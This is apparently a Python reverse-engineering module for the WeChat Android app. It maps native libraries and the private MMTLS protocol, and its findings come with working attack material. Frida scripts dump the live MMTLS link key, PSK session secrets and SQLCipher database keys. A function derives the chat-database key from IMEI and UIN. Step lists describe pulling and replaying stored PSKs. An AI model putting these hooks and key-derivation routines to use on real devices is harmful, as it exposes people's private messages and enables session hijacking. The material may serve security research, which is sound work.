#!/usr/bin/env python3
"""
WeChat Android RE Module
Synthesized from: WeChat 8.0.56 arm64 APK static RE (wechat-arm64.apk, 2025-01-09)
Build: WCONAN_BUILD_VERSION 13.0.1134+release.2024-t4.2-android_fb0253921

Architecture:
  APK → ~170 native libs (arm64-v8a)
  Core transport: libwechatnetwork.so (Mars framework + MMTLS private ext, 3.9MB)
  Protocol JNI:  libMMProtocalJni.so (pack/unpack/crypto JNI bridge, 908K)
  DB encryption: libWCDB.so (SQLite SEE custom build, 4.0MB)
  ML engine:     libXNet.so (xnet neural net / OpenCL, 26MB — NOT network)
  Main app:      libapp.so (compiled C++ business logic, 38MB)

MMTLS Protocol (mars-wechat private fork):
  Source: mars-wechat/mars/mm-ext/src/mmtls/mmtls_lib/comm/
  Crypto: ECDH + AES-GCM + HKDF (TLS 1.3 style) + SM4-GCM (CN national standard)
  Key arch: HybridEcdh (static+ephemeral) → AxEcdh (double ratchet for forward secrecy)
  Session resumption: PSK 0-RTT mode (SaveAuthLongList/SaveAuthShortList)
  Live key: mmtls::gILinkKey global (72 bytes, BSS) in libwechatnetwork.so

DB encryption:
  libWCDB.so → SQLCipher (NOT SQLite SEE — confirmed via cipherUseHmac/cipherHmacAlgorithm PRAGMAs)
  Key derivation: computerKeyWithAllStr(IMEI, UIN, etype=0→MD5) in libMMProtocalJni.so
  Algorithm table @ 0xe3c40: etype 0=MD5(16B), etype 1=SHA1(20B), etype 2=EC(128B)

Pack format (from mmpack.cpp log strings):
  Header fields: g_clientVer, type, flag, noticeid, newflag, groupKey, sequence
  Body fields:   uin, func (CGI), ret, encryptAlgo, compressAlgo, compressVer, device_id

encryptAlgo enum (from AES_GCM_ENCRYPT / SM4_GCM_ENCRYPT / ECDH_ENCRYPT strings):
  0 = NO_ENCRYPT
  1 = AES (RSA-wrapped key)
  2 = AES_GCM (symmetric, nonce-based)
  3 = ECDH_ENCRYPT (ECDH-wrapped)
  4 = SM4_GCM (Chinese national cipher, GCM mode)

Findings:
  F1  MMTLS protocol — custom TLS variant with AES-GCM + SM4-GCM + double-ratchet
  F2  ALERT_FALLBACK_NO_MMTLS — level=2/type=0x74; OnAlert@0x1cc100; sets mmtls_obj[0x3e4]=1
  F3  PSK 0-RTT session resumption — extracted PSK enables no-handshake replay
  F4  gILinkKey runtime MMTLS key extractable via Frida/ptrace
  F5  computerKeyWithAllStr DB key derivation — requires IMEI + UIN to decrypt DB
  F6  Three-repo build: mars(OSS) + mars-wechat(MMTLS) + mars-private(IP obfuscation)
  F7  libapp.so 38MB contains all business logic in compiled C++ (not Java/DEX)
  F8  .cso compressed .so format — WeChat's custom loader decompresses at runtime
  F9  SQLCipher (not SQLite SEE) — PRAGMA key interface, HMAC per-page auth, standard tooling works
"""

import subprocess
import json
import os
import struct
import hashlib
import zipfile
from pathlib import Path

try:
    import requests as _requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


# --- Key native lib targets (by attack surface) ---
MMTLS_LIBS = [
    "libwechatnetwork.so",   # Mars+MMTLS full implementation
    "libMMProtocalJni.so",   # pack/unpack/crypto JNI bridge
]
DB_LIBS = [
    "libWCDB.so",            # SQLite SEE encrypted DB
    "libmmkv.so",            # MMKV key-value store
]
CRYPTO_LIBS = [
    "libcrypto.so",          # OpenSSL 1.1.x (used by network libs)
    "libssl.so",
]
# gILinkKey address in libwechatnetwork.so arm64 v8.0.56
GILIINKKEY_VA = 0x3d4648
GILIINKKEY_SIZE = 72  # bytes, BSS section

# MMTLS JNI attack surface in libwechatnetwork.so
MMTLS_JNI_FUNCS = [
    "Java_com_tencent_mm_jni_utils_UtilsJni_GenEcdhKeyPair",
    "Java_com_tencent_mm_jni_utils_UtilsJni_Ecdh",
    "Java_com_tencent_mm_jni_utils_UtilsJni_HKDF",
    "Java_com_tencent_mm_jni_utils_UtilsJni_HybridEcdhEncrypt",
    "Java_com_tencent_mm_jni_utils_UtilsJni_HybridEcdhDecrypt",
    "Java_com_tencent_mm_jni_utils_UtilsJni_AxEcdhEncrypt",
    "Java_com_tencent_mm_jni_utils_UtilsJni_AxEcdhDecrypt",
    "Java_com_tencent_mm_jni_utils_UtilsJni_AesGcmEncryptWithNonce",
    "Java_com_tencent_mm_jni_utils_UtilsJni_AesGcmDecryptWithNonce",
    "Java_com_tencent_mars_mm_MMLogic_clearMMtlsForbidenHostAndPsk",
    "Java_com_tencent_mars_mm_MMLogic_saveAuthLongList",
    "Java_com_tencent_mars_mm_MMLogic_saveAuthShortList",
]

# Protocol JNI attack surface in libMMProtocalJni.so
PROTO_JNI_FUNCS = [
    "Java_com_tencent_mm_protocal_MMProtocalJni_pack",
    "Java_com_tencent_mm_protocal_MMProtocalJni_packHybrid",
    "Java_com_tencent_mm_protocal_MMProtocalJni_packHybridEcdh",
    "Java_com_tencent_mm_protocal_MMProtocalJni_packDoubleHybrid",
    "Java_com_tencent_mm_protocal_MMProtocalJni_unpack",
    "Java_com_tencent_mm_protocal_MMProtocalJni_generateECKey",
    "Java_com_tencent_mm_protocal_MMProtocalJni_computerKeyWithAllStr",
    "Java_com_tencent_mm_protocal_MMProtocalJni_aesDecrypt",
    "Java_com_tencent_mm_protocal_MMProtocalJni_aesEncrypt",
]


def _run(cmd, **kwargs):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, **kwargs)
        return r.stdout, r.stderr, r.returncode
    except Exception as e:
        return "", str(e), -1


class WeChatREAnalyzer:
    """
    Static and runtime RE for WeChat Android app.
    Targets: MMTLS protocol internals, DB key derivation, native lib attack surface.
    """

    def __init__(self, apk_path=None, libs_dir=None):
        self.apk_path = Path(apk_path) if apk_path else None
        self.libs_dir = Path(libs_dir) if libs_dir else None
        self.findings = []
        self.lib_inventory = {}
        self._arch = "arm64-v8a"

    # ------------------------------------------------------------------
    # APK analysis
    # ------------------------------------------------------------------

    def analyze_apk(self):
        """Extract metadata and native lib inventory from APK."""
        if not self.apk_path or not self.apk_path.exists():
            return {"error": f"APK not found: {self.apk_path}"}

        result = {
            "apk": str(self.apk_path),
            "size_mb": round(self.apk_path.stat().st_size / 1e6, 1),
        }

        try:
            with zipfile.ZipFile(str(self.apk_path)) as zf:
                names = zf.namelist()
                arm64_libs = [n for n in names if n.startswith(f"lib/{self._arch}/") and n.endswith(".so")]
                cso_libs   = [n for n in names if n.startswith(f"lib/{self._arch}/") and n.endswith(".cso.so")]
                stub_libs  = []
                full_libs  = []
                for n in arm64_libs:
                    info = zf.getinfo(n)
                    if info.file_size <= 64:
                        stub_libs.append(n)
                    else:
                        full_libs.append((n, info.file_size))

                result["native_lib_count"] = len(arm64_libs)
                result["cso_compressed_count"] = len(cso_libs)
                result["stub_shim_count"] = len(stub_libs)
                result["top_libs_by_size"] = sorted(
                    [(Path(n).name, round(sz / 1e6, 2)) for n, sz in full_libs],
                    key=lambda x: -x[1]
                )[:20]

                # AndroidManifest.xml (binary XML, partial parse)
                if "AndroidManifest.xml" in names:
                    raw = zf.read("AndroidManifest.xml")
                    result["manifest_size"] = len(raw)

        except Exception as e:
            result["error"] = str(e)

        return result

    # ------------------------------------------------------------------
    # Native lib symbol analysis
    # ------------------------------------------------------------------

    def enumerate_native_libs(self):
        """Run nm -D against key native libs to enumerate JNI exports."""
        if not self.libs_dir:
            return {}

        lib_base = self.libs_dir / self._arch
        results = {}

        for lib_name in MMTLS_LIBS + DB_LIBS:
            lib_path = lib_base / lib_name
            if not lib_path.exists():
                results[lib_name] = {"status": "not_found"}
                continue

            stdout, _, rc = _run(["nm", "-D", "--defined-only", str(lib_path)])
            exports = [line.strip() for line in stdout.splitlines() if " T " in line]
            jni_exports = [e for e in exports if "Java_" in e]
            size_mb = round(lib_path.stat().st_size / 1e6, 2)

            results[lib_name] = {
                "size_mb": size_mb,
                "total_exports": len(exports),
                "jni_exports": len(jni_exports),
                "jni_functions": [e.split(" T ")[-1] for e in jni_exports],
            }

        self.lib_inventory = results
        return results

    # ------------------------------------------------------------------
    # MMTLS protocol surface
    # ------------------------------------------------------------------

    def analyze_mmtls(self):
        """
        Reconstruct MMTLS attack surface from static RE.
        Based on symbols/strings extracted from libwechatnetwork.so.
        """
        findings = []

        # F1: MMTLS crypto architecture
        findings.append({
            "id": "WX-F1",
            "title": "MMTLS Two-Tier Crypto: HybridEcdh + AxEcdh (double ratchet)",
            "severity": "INFO",
            "detail": (
                "MMTLS uses a two-tier key architecture:\n"
                "  Tier 1 — HybridEcdh: static server key + ephemeral client key → session key\n"
                "  Tier 2 — AxEcdh: double ratchet (Signal-style) for forward secrecy\n"
                "Cipher suites: AES-GCM (default), SM4-GCM (Chinese national standard fallback)\n"
                "KDF: HKDF (HKDF-Expand-Finished-Secret visible in log strings)\n"
                "Handshake format: mmtls_handshake_messages.cpp (private mars-wechat repo)"
            ),
            "evidence": {
                "symbols": ["Java_com_tencent_mm_jni_utils_UtilsJni_HybridEcdhEncrypt",
                           "Java_com_tencent_mm_jni_utils_UtilsJni_AxEcdhEncrypt",
                           "Java_com_tencent_mm_jni_utils_UtilsJni_AesGcmEncryptWithNonce",
                           "Java_com_tencent_mm_jni_utils_UtilsJni_HKDF"],
                "source_path": "mars-wechat/mars/mm-ext/src/mmtls/mmtls_lib/comm/",
                "sm4_string": "SM4_GCM_ENCRYPT no need decrypt here len:%d algo:%d",
            },
        })

        # F2: Protocol downgrade via ALERT_FALLBACK_NO_MMTLS
        findings.append({
            "id": "WX-F2",
            "title": "MMTLS Downgrade: ALERT_FALLBACK_NO_MMTLS forces plaintext HTTPS fallback",
            "severity": "MEDIUM",
            "detail": (
                "Server can send ALERT_FALLBACK_NO_MMTLS to force WeChat to downgrade to HTTPS.\n"
                "Alert wire format: level=2 (fatal, uint8 @ alert_struct+0x08), type=0x74 (uint16 LE @ alert_struct+0x0a).\n"
                "OnAlert dispatch @ libwechatnetwork.so:0x1cc100: level==2 → type check → 0x74 → handler @ 0x1cc308.\n"
                "Handler verifies session ticket (bl 0x1d98a0), then sets mmtls_obj[0x3e4]=1 (MMTLS disabled flag).\n"
                "Log string @ 0x6a2c2 (typo in binary): 'recevie fallback no mmtls alert and verify succ, set no mmtls, %u'.\n"
                "type==0x73: PSK_DELETE alert — 'debug: delete access psk, ret %d' (@ 0x4b376), calls PSK invalidation.\n"
                "Source: mmtls_client_handshake_state.h (embedded path @ 0x4b40f).\n"
                "MITM injection requires valid alert signature (bl 0x1d98a0 verifies before setting flag)."
            ),
            "evidence": {
                "alert_type_fallback":   "0x74 (116 decimal)",
                "alert_type_psk_delete": "0x73 (115 decimal)",
                "alert_level":           "2 (fatal)",
                "on_alert_va":           "0x1cc100",
                "fallback_handler_va":   "0x1cc308",
                "mmtls_disabled_flag":   "mmtls_obj+0x3e4 = 1",
                "log_va":                "0x6a2c2",
                "log_string":            "recevie fallback no mmtls alert and verify succ, set no mmtls, %u",
                "psk_delete_log_va":     "0x4b376",
                "fallback_log_vas":      ["0x3553d", "0x39ff2", "0x416cf"],
                "error_codes":           {"valid": "kEctMMTLSValidFallbackAlert @ 0x521ad",
                                          "invalid": "kEctMMTLSInvalidFallbackAlert @ 0x795bd"},
            },
            "frida_hook": (
                "// Hook OnAlert to detect FALLBACK\n"
                "var base = Module.findBaseAddress('libwechatnetwork.so');\n"
                "Interceptor.attach(base.add(0x1cc100), {\n"
                "    onEnter: function(args) {\n"
                "        var alert = ptr(args[0]);\n"
                "        var level = alert.add(0x08).readU8();\n"
                "        var type  = alert.add(0x0a).readU16();\n"
                "        if (type === 0x74) {\n"
                "            console.log('[WX-F2] ALERT_FALLBACK_NO_MMTLS level=' + level + ' type=0x' + type.toString(16));\n"
                "        } else if (type === 0x73) {\n"
                "            console.log('[WX-F2] PSK_DELETE alert');\n"
                "        }\n"
                "    }\n"
                "});\n"
                "// Or hook flag write: base+0x1cc3e4 (strb w8, [x19+0x3e4])"
            ),
        })

        # F3: PSK 0-RTT session resumption
        findings.append({
            "id": "WX-F3",
            "title": "MMTLS PSK 0-RTT Session Resumption — extracted PSK enables replay",
            "severity": "HIGH",
            "detail": (
                "WeChat stores MMTLS session PSKs in 'Auth Long List' and 'Auth Short List'.\n"
                "PSKs are serialized (MAX_SERIALIZED_PSK_LEN enforced) and stored as\n"
                "  encrypted_refresh_psk + encrypted_ticket in ClientCredStorage.\n"
                "On reconnect, WeChat sends PSK in 0-RTT mode (HS_MODE_ZERO_RTT_PSK).\n"
                "\n"
                "On-disk file: /data/data/com.tencent.mm/files/mmtls/%08llx (hex session ID)\n"
                "File format: [IV 12B][ciphertext N bytes][GCM auth tag 16B]\n"
                "\n"
                "PSK encryption key source candidates (ranked by likelihood):\n"
                "  1. HARDCODED: 16/32-byte entropy blob in libwechatnetwork.so .rodata\n"
                "     → scan: python3 -c \"d=open('libwechatnetwork.so','rb').read(); "
                "[print(hex(i),d[i:i+32].hex()) for i in range(0,len(d)-32,4) "
                "if d[i:i+32].count(0)<4 and all(d[i+j]!=0 for j in range(0,32,4))]\"\n"
                "  2. DEVICE-DERIVED: HKDF(ANDROID_ID | UIN, salt=hardcoded, info='mmtls')\n"
                "  3. ANDROID KEYSTORE: unlikely (performance; getEncoded() returns null)\n"
                "\n"
                "Attack: extract PSK from device storage → replay as WeChat client without\n"
                "  completing ECDH handshake. Requires access to app private data dir."
            ),
            "evidence": {
                "symbols": ["Java_com_tencent_mars_mm_MMLogic_saveAuthLongList",
                           "Java_com_tencent_mars_mm_MMLogic_saveAuthShortList",
                           "Java_com_tencent_mars_mm_MMLogic_clearMMtlsForbidenHostAndPsk"],
                "strings": ["ClientCredStorage",
                           "size == encrypted_refresh_psk.size()",
                           "mmtls: MAX_SERIALIZED_PSK_LEN=%d, read read size=%zu",
                           "(state_.mode() != HS_MODE_ZERO_RTT_PSK && app_data != NULL)"],
                "file_path": "/data/data/com.tencent.mm/files/mmtls/%08llx",
                "file_format": "IV[12] || AES-GCM-ciphertext || tag[16]",
            },
            "attack_path": (
                "1. Root device or ADB backup on unpatched device\n"
                "2. adb shell run-as com.tencent.mm ls files/mmtls/\n"
                "3. Pull /data/data/com.tencent.mm/files/mmtls/<hex> files\n"
                "4. Determine encryption key: hook EVP_DecryptInit_ex arg4 in libwechatnetwork.so\n"
                "5. Decrypt: IV=bytes[0:12], tag=bytes[-16:], ciphertext=bytes[12:-16]\n"
                "6. Deserialize PSK using mmtls_lib proto format\n"
                "7. Replay with mmtls client using 0-RTT mode (HS_MODE_ZERO_RTT_PSK)"
            ),
            "frida_hook": (
                "// Find PSK file path via open() intercept\n"
                "Interceptor.attach(Module.findExportByName('libc.so', 'open'), {\n"
                "  onEnter(args) {\n"
                "    const path = args[0].readCString();\n"
                "    if (path && path.includes('mmtls')) console.log('[mmtls open]', path);\n"
                "  }\n"
                "});\n"
                "// Extract AES-GCM key from EVP_DecryptInit_ex\n"
                "const EVP_Di = Module.findExportByName('libssl.so', 'EVP_DecryptInit_ex');\n"
                "if (EVP_Di) Interceptor.attach(EVP_Di, {\n"
                "  onEnter(args) {\n"
                "    if (!args[3].isNull()) console.log('[PSK key]', hexdump(args[3], {length:32}));\n"
                "    if (!args[4].isNull()) console.log('[PSK iv]',  hexdump(args[4], {length:12}));\n"
                "  }\n"
                "});"
            ),
        })

        # F4: gILinkKey runtime key extraction
        findings.append({
            "id": "WX-F4",
            "title": "gILinkKey runtime MMTLS link key extractable via Frida/ptrace",
            "severity": "HIGH",
            "detail": (
                "mmtls::gILinkKey is a 72-byte OBJECT in BSS of libwechatnetwork.so.\n"
                f"VA: 0x{GILIINKKEY_VA:x}, size: {GILIINKKEY_SIZE} bytes\n"
                "Contains live MMTLS session key material for the active connection.\n"
                "Frida: read from memory after LongLinkWithMMTLS constructor returns.\n"
                "ptrace: PTRACE_PEEKDATA on WeChat PID at resolved VA after lib load.\n"
                "\n"
                "Struct layout hypotheses (72 bytes = 9×8B or mixed):\n"
                "  H1 (dual-cipher): AES-256-key[16] | SM4-key[16] | GCM-nonce[12] |\n"
                "                    PSK-identity[16] | session-id[8] | flags[4]\n"
                "  H2 (single-cipher): key[32] | nonce[12] | counter[4] | pad[24]\n"
                "Confirm by tracing EVP_EncryptInit_ex args: arg3=key ptr, arg4=nonce ptr,\n"
                "measuring byte distance from gILinkKey base.\n"
                "\n"
                "ARM64 RE note: LDP instruction loads two consecutive 8-byte fields\n"
                "simultaneously — LDP x19, x20, [x0, #0x10] loads +0x10 and +0x18.\n"
                "Ctor entry point: LongLinkWithMMTLSC1E @ 0x1ab2c4; expect prologue:\n"
                "  stp x29, x30, [sp, #-N]! then stp x19, x20, [sp, #M] (callee save)\n"
                "  then str/stp to [x0, #field_offset] for member initialization."
            ),
            "evidence": {
                "symbol": "_ZN5mmtls9gILinkKeyE",
                "va": hex(GILIINKKEY_VA),
                "size": GILIINKKEY_SIZE,
                "section": "BSS (GLOBAL OBJECT)",
                "ctor_va": "0x1ab2c4 (LongLinkWithMMTLSC1E)",
                "key_deriv_errors": [
                    "0x625eb: 'hkdf expand connection key fail'",
                    "0x7b4f3: 'compute connection keys fail'",
                    "0x7022a: 'hash for derving connection key fail'",
                ],
            },
            "frida_hook": (
                "// Read gILinkKey from running WeChat process\n"
                "const libnet = Process.getModuleByName('libwechatnetwork.so');\n"
                "const keyAddr = libnet.base.add(0x{va:x});\n"
                "console.log('[gILinkKey dump]');\n"
                "console.log(hexdump(keyAddr, {{length: {sz}}}));\n"
                "\n"
                "// Catch init moment via MemoryAccessMonitor\n"
                "MemoryAccessMonitor.enable({{base: keyAddr, size: {sz}}}, {{\n"
                "  onAccess(d) {{\n"
                "    if (d.operation === 'write') {{\n"
                "      console.log('[gILinkKey write] from', d.from, 'offset', d.rangeIndex);\n"
                "      console.log(Thread.backtrace(this.context, Backtracer.ACCURATE)\n"
                "        .map(DebugSymbol.fromAddress).join('\\n'));\n"
                "    }}\n"
                "  }}\n"
                "}});\n"
                "\n"
                "// Hook EVP_EncryptInit_ex to correlate key/nonce offsets\n"
                "const EVP_Ei = Module.findExportByName('libssl.so', 'EVP_EncryptInit_ex');\n"
                "if (EVP_Ei) Interceptor.attach(EVP_Ei, {{\n"
                "  onEnter(args) {{\n"
                "    const keyPtr = args[3]; const ivPtr = args[4];\n"
                "    if (!keyPtr.isNull()) {{\n"
                "      const off = keyPtr.sub(keyAddr).toInt32();\n"
                "      console.log('[EVP key] gILinkKey+' + off, hexdump(keyPtr, {{length:32}}));\n"
                "    }}\n"
                "    if (!ivPtr.isNull()) {{\n"
                "      const off = ivPtr.sub(keyAddr).toInt32();\n"
                "      console.log('[EVP iv]  gILinkKey+' + off, hexdump(ivPtr, {{length:12}}));\n"
                "    }}\n"
                "  }}\n"
                "}});".format(va=GILIINKKEY_VA, sz=GILIINKKEY_SIZE)
            ),
        })

        # F5: DB key derivation (CORRECTED: SQLCipher, not SQLite SEE)
        findings.append({
            "id": "WX-F5",
            "title": "WeChat DB key: computerKeyWithAllStr(IMEI, UIN, etype=0→MD5) → SQLCipher key",
            "severity": "HIGH",
            "detail": (
                "libWCDB.so uses SQLCipher (NOT SQLite SEE).\n"
                "Evidence: cipherUseHmac/cipherHmacAlgorithm/cipherDefaultUseHmac PRAGMAs in libWCDB.so,\n"
                "sha1_block_data_order + _armv8_sha1_probe (SQLCipher HMAC path).\n"
                "Key derivation: computerKeyWithAllStr dispatches via etype parameter:\n"
                "  etype 0 (DB key): output_size=16 → MD5; fn @ libMMProtocalJni.so:0x3f438\n"
                "  etype 1: output_size=20 → SHA1; fn @ libMMProtocalJni.so:0x3f4d8\n"
                "  etype 2: output_size=128 → EC key (no direct compute fn)\n"
                "Algorithm dispatch table: libMMProtocalJni.so @ 0xe3c40\n"
                "Result: MD5(IMEI+UIN).hexdigest()[:7] = 7-char SQLCipher PRAGMA key.\n"
                "Attack: IMEI from device + UIN from login → compute key → sqlcipher open."
            ),
            "evidence": {
                "jni_func": "Java_com_tencent_mm_protocal_MMProtocalJni_computerKeyWithAllStr",
                "algo_table": "libMMProtocalJni.so @ 0xe3c40 (etype→{size,fn_ptr})",
                "lib": "libWCDB.so (SQLCipher)",
                "sqlcipher_pragmas": [
                    "cipherUseHmac", "cipherHmacAlgorithm", "cipherDefaultUseHmac"
                ],
            },
            "key_formula": (
                "# Confirmed from static RE (etype=0 path, MD5, 16-byte output → 7-char hex):\n"
                "import hashlib\n"
                "def wechat_db_key(imei_or_android_id: str, uin: str) -> str:\n"
                "    # API <= 28: imei = TelephonyManager.getDeviceId() or getImei(0)\n"
                "    # API >= 29: IMEI access restricted; WeChat falls back to ANDROID_ID:\n"
                "    #   adb shell settings get secure android_id\n"
                "    raw = (imei_or_android_id + uin).encode('utf-8')\n"
                "    return hashlib.md5(raw).hexdigest()[:7]\n"
                "# Open DB (SQLCipher 3.x params):\n"
                "#   sqlcipher EnMicroMsg.db\n"
                "#   PRAGMA key='<7chars>';\n"
                "#   PRAGMA cipher_compatibility=3;\n"
                "#   .tables"
            ),
            "frida_hook": (
                "// Hook sqlite3_key to capture the key at open time\n"
                "['sqlite3_key', 'sqlite3_key_v2'].forEach(name => {\n"
                "  const fn = Module.findExportByName(null, name);\n"
                "  if (fn) Interceptor.attach(fn, {\n"
                "    onEnter(args) {\n"
                "      const nBytes = args[name === 'sqlite3_key' ? 2 : 3].toInt32();\n"
                "      const kPtr  = args[name === 'sqlite3_key' ? 1 : 2];\n"
                "      console.log('[' + name + '] key =', kPtr.readUtf8String(nBytes));\n"
                "    }\n"
                "  });\n"
                "});\n"
                "// Hook MessageDigest.update to catch MD5 input (IMEI+UIN concatenation)\n"
                "Java.perform(() => {\n"
                "  const MD = Java.use('java.security.MessageDigest');\n"
                "  MD.update.overload('[B').implementation = function(b) {\n"
                "    const alg = this.getAlgorithm();\n"
                "    if (alg === 'MD5') console.log('[MD5 input]',\n"
                "      Java.use('java.lang.String').$new(b, 'UTF-8'));\n"
                "    return this.update(b);\n"
                "  };\n"
                "});"
            ),
        })

        # F6: Pack format reconstruction
        findings.append({
            "id": "WX-F6",
            "title": "WeChat pack format reconstructed from mmpack.cpp log strings",
            "severity": "INFO",
            "detail": (
                "Header: g_clientVer(u32), type(u8), flag(u8), noticeid(u32),\n"
                "        newflag(u8), groupKey(u8), sequence(u32)\n"
                "Body:   uin(u32), func(u16 CGI cmd), ret(i32), device_id(u32)\n"
                "        encryptAlgo(u8), compressAlgo(u8), compressVer(u8)\n"
                "\n"
                "encryptAlgo values (from string evidence):\n"
                "  0 = NO_ENCRYPT\n"
                "  1 = AES (classic, RSA-wrapped key)\n"
                "  2 = AES_GCM (symmetric nonce-based)\n"
                "  3 = ECDH_ENCRYPT\n"
                "  4 = SM4_GCM (Chinese national cipher)\n"
                "\n"
                "Pack variants: pack / packHybrid / packHybridEcdh / packDoubleHybrid\n"
                "Source: Comm/mmpack.cpp, build path: /data/landun/workspace/libprotocaljni/"
            ),
            "evidence": {
                "log_strings": [
                    "writing head, g_clientVer: %d, type:%d, flag:%d noticeid:%d, newflag:%d groupKey:%d sequence:%d",
                    "packing done, uin=%d, func=%d, ret=%d, encryptAlgo=%d, compressAlgo=%d",
                    "AES_GCM_ENCRYPT no need compress again here. type:%d",
                    "SM4_GCM_ENCRYPT no need decrypt here len:%d algo:%d",
                ],
            },
        })

        self.findings.extend(findings)
        return findings

    # ------------------------------------------------------------------
    # Runtime hooks (Frida script generation)
    # ------------------------------------------------------------------

    def generate_frida_hooks(self):
        """Generate Frida script targeting MMTLS key extraction and pack intercept."""
        script = '''\
"use strict";
// WeChat MMTLS + Pack interceptor — generated by Ablation wechat_re
// Target: WeChat {ver} arm64

var libnet = null;
var libproto = null;

function waitForLib(name, cb) {{
    var mod = Process.findModuleByName(name);
    if (mod) {{ cb(mod); return; }}
    var h = setInterval(function() {{
        var m = Process.findModuleByName(name);
        if (m) {{ clearInterval(h); cb(m); }}
    }}, 200);
}}

// Hook 1: Extract gILinkKey on LongLinkWithMMTLS construction
waitForLib("libwechatnetwork.so", function(mod) {{
    libnet = mod;

    // gILinkKey — live MMTLS session key (72 bytes, BSS)
    var keyPtr = mod.base.add(0x{giliinkkey:x});
    console.log("[wechat_re] gILinkKey addr: " + keyPtr);

    // Hook LongLinkWithMMTLS ctor to dump key after handshake
    var ctor_rva = 0x1ab2c4;  // from nm -D
    var ctorPtr = mod.base.add(ctor_rva);
    Interceptor.attach(ctorPtr, {{
        onLeave: function(retval) {{
            var key = keyPtr.readByteArray(72);
            console.log("[wechat_re] gILinkKey after ctor:");
            console.log(hexdump(key, {{header: false, ansi: false}}));
        }}
    }});

    // Hook GenEcdhKeyPair to capture ephemeral ECDH keys
    var genEcdh = Module.findExportByName("libwechatnetwork.so",
        "Java_com_tencent_mm_jni_utils_UtilsJni_GenEcdhKeyPair");
    if (genEcdh) {{
        Interceptor.attach(genEcdh, {{
            onLeave: function(retval) {{
                console.log("[wechat_re] GenEcdhKeyPair returned: " + retval);
            }}
        }});
    }}

    // Hook saveAuthLongList to capture PSK material
    var savePsk = Module.findExportByName("libwechatnetwork.so",
        "Java_com_tencent_mars_mm_MMLogic_saveAuthLongList");
    if (savePsk) {{
        Interceptor.attach(savePsk, {{
            onEnter: function(args) {{
                // args[2] = hostname string, args[3] = PSK map (jobject)
                var host = Java.vm.tryGetEnv().getStringUtfChars(args[2], null)
                    .readCString();
                console.log("[wechat_re] saveAuthLongList host: " + host);
            }}
        }});
    }}
}});

// Hook 2: Intercept pack/unpack for plaintext message capture
waitForLib("libMMProtocalJni.so", function(mod) {{
    libproto = mod;

    var packFn = Module.findExportByName("libMMProtocalJni.so",
        "Java_com_tencent_mm_protocal_MMProtocalJni_pack");
    if (packFn) {{
        Interceptor.attach(packFn, {{
            onEnter: function(args) {{
                // args[2] = body ByteBuffer, args[3] = key ByteBuffer
                console.log("[wechat_re] pack() called");
            }},
            onLeave: function(retval) {{
                console.log("[wechat_re] pack() done, ret=" + retval);
            }}
        }});
    }}

    var unpackFn = Module.findExportByName("libMMProtocalJni.so",
        "Java_com_tencent_mm_protocal_MMProtocalJni_unpack");
    if (unpackFn) {{
        Interceptor.attach(unpackFn, {{
            onEnter: function(args) {{
                console.log("[wechat_re] unpack() called");
            }}
        }});
    }}

    // computerKeyWithAllStr — DB key derivation intercept
    var dbKeyFn = Module.findExportByName("libMMProtocalJni.so",
        "Java_com_tencent_mm_protocal_MMProtocalJni_computerKeyWithAllStr");
    if (dbKeyFn) {{
        Interceptor.attach(dbKeyFn, {{
            onEnter: function(args) {{
                try {{
                    var env = Java.vm.tryGetEnv();
                    if (env && args[2]) {{
                        var s1 = env.getStringUtfChars(args[2], null).readCString();
                        var s2 = args[3] ? env.getStringUtfChars(args[3], null).readCString() : "";
                        console.log("[wechat_re] computerKeyWithAllStr: arg1=" + s1 + " arg2=" + s2);
                    }}
                }} catch(e) {{}}
            }},
            onLeave: function(retval) {{
                try {{
                    var env = Java.vm.tryGetEnv();
                    if (env && retval && !retval.isNull()) {{
                        var key = env.getStringUtfChars(retval, null).readCString();
                        console.log("[wechat_re] DB key: " + key);
                    }}
                }} catch(e) {{}}
            }}
        }});
    }}
}});
'''.format(
            ver="8.0.56",
            giliinkkey=GILIINKKEY_VA,
        )
        return script

    # ------------------------------------------------------------------
    # DB key derivation (offline computation)
    # ------------------------------------------------------------------

    def compute_db_key(self, imei: str, uin: str) -> str:
        """
        WeChat DB key derivation (etype=0 path).
        Confirmed from static RE: etype=0 → MD5 (16-byte digest), first 7 hex chars.
        libWCDB.so uses SQLCipher; open with: PRAGMA key='<result>';
        """
        raw = (imei + uin).encode("utf-8")
        return hashlib.md5(raw).hexdigest()[:7]

    # ------------------------------------------------------------------
    # Live process analysis (Android/ADB)
    # ------------------------------------------------------------------

    def probe_live_process(self):
        """
        Check if WeChat is running and probe via ADB (requires device connected).
        """
        result = {}

        # Check ADB
        stdout, _, rc = _run(["adb", "devices"])
        if rc != 0:
            return {"adb": "not available"}

        lines = [l for l in stdout.splitlines() if "\tdevice" in l]
        if not lines:
            return {"adb": "no device connected"}

        result["adb_device"] = lines[0].split("\t")[0]

        # Check if WeChat is running
        stdout, _, _ = _run(["adb", "shell", "pidof", "com.tencent.mm"])
        if stdout.strip():
            result["wechat_pid"] = stdout.strip()
            result["wechat_running"] = True

            # Get loaded libs
            pid = stdout.strip()
            maps_stdout, _, _ = _run(["adb", "shell", f"cat /proc/{pid}/maps"])
            mmtls_loaded = any("libwechatnetwork" in l for l in maps_stdout.splitlines())
            result["libwechatnetwork_loaded"] = mmtls_loaded

            # Get data directory contents (requires root/adb-over-tcp on rooted device)
            stdout2, _, rc2 = _run(["adb", "shell", "run-as", "com.tencent.mm", "ls", "files/"])
            if rc2 == 0:
                result["wechat_files"] = stdout2.splitlines()
        else:
            result["wechat_running"] = False

        return result

    # ------------------------------------------------------------------
    # Full analysis
    # ------------------------------------------------------------------

    def run(self):
        """Run full static analysis pipeline."""
        results = {}

        print("[*] WeChat RE — APK analysis")
        if self.apk_path:
            results["apk"] = self.analyze_apk()

        print("[*] WeChat RE — native lib enumeration")
        if self.libs_dir:
            results["native_libs"] = self.enumerate_native_libs()

        print("[*] WeChat RE — MMTLS attack surface reconstruction")
        results["mmtls_findings"] = self.analyze_mmtls()

        print("[*] WeChat RE — Frida hook generation")
        results["frida_script"] = self.generate_frida_hooks()

        return results

    def report(self):
        """Print findings in Ablation format."""
        lines = ["\n=== WeChat RE Findings ===\n"]
        for f in self.findings:
            severity = f.get("severity", "INFO")
            lines.append(f"[{severity}] {f['id']}: {f['title']}")
            for line in f.get("detail", "").splitlines():
                lines.append(f"  {line}")
            if f.get("frida_hook"):
                lines.append("  [Frida]:")
                for fl in f["frida_hook"].splitlines():
                    lines.append(f"    {fl}")
            lines.append("")
        return "\n".join(lines)
